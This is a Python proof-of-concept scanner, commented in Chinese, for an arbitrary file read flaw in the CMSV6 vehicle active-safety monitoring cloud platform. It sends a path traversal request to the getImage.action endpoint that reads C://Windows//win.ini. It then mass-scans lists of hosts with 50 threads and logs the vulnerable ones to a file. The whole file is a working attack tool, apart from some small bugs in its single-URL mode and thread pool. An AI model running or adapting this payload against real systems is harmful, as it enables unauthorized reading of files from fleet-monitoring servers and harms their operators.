import argparse,sys,requests,random
from multiprocessing.dummy import Pool
def poc(target):
    payload="/808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100"
    headres={
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "Connection": "Keep-Alive"
    }

    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    try:
        res1=requests.get(url=target,headers=headres)
        if res1.status_code == 200:
            res2=requests.get(url=target+payload,headers=headres)
            if 'MAPI=1' in res2.text:
                print(f"[+]{target}存在任意文件读取漏洞")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]该{target}不存在任意文件读取漏洞")
        else:
            print(f"[*]该{target}存在问题,请手工测试")        
    except:
        pass
def main():
    #定义
    parser=argparse.ArgumentParser(description="鸿运(通天星CMSV6车载)主动安全监控云平台存在任意文件读取漏洞")
    # 添加命令行参数
    parser.add_argument('-u','--url',dest='url',type=str,help='place input lik')
    parser.add_argument('-f','--file',dest='file',type=str,help='place input your le path')
    # 实例化
    args=parser.parse_args()
    # 判断用户的输入
    if args.url and not args.file:
        print(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage: python{sys.argv[0]} -h")
if __name__=='__main__':
    main()
